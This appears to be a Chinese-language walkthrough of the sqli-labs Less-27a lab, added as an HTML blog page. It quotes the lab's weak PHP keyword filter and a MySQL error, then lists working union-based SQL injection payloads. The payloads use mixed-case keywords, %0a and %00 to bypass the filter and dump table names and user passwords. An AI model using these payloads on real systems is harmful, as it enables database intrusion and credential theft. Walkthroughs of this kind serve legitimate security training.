@@ -1,0 +1,37 @@
+<hr>
+<h2 id="title-less27aurl-https-www-yuque-com-u29002979-ep2zrx-lgo2i0n2e5wkpr0w"><a href="#title-less27aurl-https-www-yuque-com-u29002979-ep2zrx-lgo2i0n2e5wkpr0w" class="headerlink" title="title: less27aurl: https://www.yuque.com/u29002979/ep2zrx/lgo2i0n2e5wkpr0w"></a>title: less27a<br>url: <a href="https://www.yuque.com/u29002979/ep2zrx/lgo2i0n2e5wkpr0w">https://www.yuque.com/u29002979/ep2zrx/lgo2i0n2e5wkpr0w</a></h2><pre><code class="bash">$id = &#39;&quot;&#39; .$id. &#39;&quot;&#39;;
+$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;
+
+$id= preg_replace(&#39;/[\/*]/&#39;,&quot;&quot;, $id);		//strip out /*
+$id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);		  //Strip out --.
+$id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);			  //Strip out #.
+$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);	    //Strip out spaces.
+
+$id= preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id);	  //Strip out spaces.
+$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);	    //Strip out spaces.
+$id= preg_replace(&#39;/union/s&#39;,&quot;&quot;, $id);	   //Strip out union
+$id= preg_replace(&#39;/select/s&#39;,&quot;&quot;, $id);	   //Strip out select
+$id= preg_replace(&#39;/UNION/s&#39;,&quot;&quot;, $id);	   //Strip out UNION
+$id= preg_replace(&#39;/SELECT/s&#39;,&quot;&quot;, $id);	   //Strip out SELECT
+$id= preg_replace(&#39;/Union/s&#39;,&quot;&quot;, $id);	   //Strip out Union
+$id= preg_replace(&#39;/Select/s&#39;,&quot;&quot;, $id);	   //Strip out Select
+</code></pre>
+<p>发现闭合方式为<strong>双引号</strong>，其余与Less27相同</p>
+<p><code>1&quot;</code></p>
+<blockquote>
+<p><strong>Warning</strong>: mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>E:\phpstudy_pro\WWW\sql.com\Less-27a\index.php</strong> on line <strong>37</strong></p>
+</blockquote>
+<p>双引号闭合</p>
+<p><a name="nAsN4"></a></p>
+<h1 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h1><blockquote>
+<p>uniOn<br>selEct<br>%0a：空格<br>00截断：%00</p>
+</blockquote>
+<pre><code class="bash">爆破数据库名称
+0&quot;%0a uniOn %0a selEct %0a 1,2,database();%00
+爆破数据表名称
+0&quot;%0a uniOn %0a selEct %0a 1,2,(selEct %0a group_concat(table_name) %0a from %0a information_schema.tables %0a where %0a table_schema=database());%00 
+爆破字段名
+0&quot;%0a uniOn %0a selEct %0a 1,2,(selEct%0agroup_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_schema=database()%0aand%0atable_name=&#39;users&#39;);%00
+爆破字段内容
+0&quot;%0a uniOn %0a selEct %0a 1,2,(selEct(group_concat(username,0x7e,password))from%0ausers);%00
+</code></pre>
